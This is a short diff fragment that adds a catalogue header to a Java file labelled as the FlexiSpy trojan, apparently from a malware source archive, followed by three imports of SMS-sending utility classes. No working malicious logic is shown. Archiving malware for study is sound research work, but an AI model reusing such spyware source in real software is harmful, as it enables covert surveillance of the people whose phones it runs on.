@@ -1,3 +1,14 @@
+/*
+  name      FlexiSpy
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 import com.vvt.smsutil.FxSMSMessage;
 import com.vvt.smsutil.SMSSendListener;
 import com.vvt.smsutil.SMSSender;
